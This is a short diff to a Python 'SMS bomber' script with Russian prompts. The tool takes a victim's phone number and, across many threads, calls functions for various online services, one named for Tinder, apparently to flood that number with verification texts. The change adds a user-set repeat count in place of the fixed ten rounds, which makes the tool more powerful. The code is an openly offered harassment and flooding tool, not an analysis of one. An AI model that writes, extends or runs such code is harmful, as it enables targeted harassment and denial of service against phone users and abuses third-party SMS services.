@@ -7,6 +7,9 @@ import threading
 print('СМС бомбер. \n Чтоб Заспамить номер телефона , введите его, без +7  ')
 number = input()
 print('введен номер', number)
+print('Введите количество повторов')
+raz = input()
+print('введено повторов ', raz)
 
 # Как гласит правило - не повторяй свой код - поэтому сначала напишем простую функцию запуска драйвера
 def SMS_bomber_WebDriver():
@@ -823,7 +826,8 @@ def SMS_bomber_all_service21(number):
     SMS_bomber_Tinder(number)
     print('Сервисы закончились')
 
-for i in range(10):
+raz=int(raz)
+for i in range(raz):
     t1 = threading.Thread(target=SMS_bomber_all_service1, args=(number,))
     t2 = threading.Thread(target=SMS_bomber_all_service2, args=(number,))
     t3 = threading.Thread(target=SMS_bomber_all_service3, args=(number,))
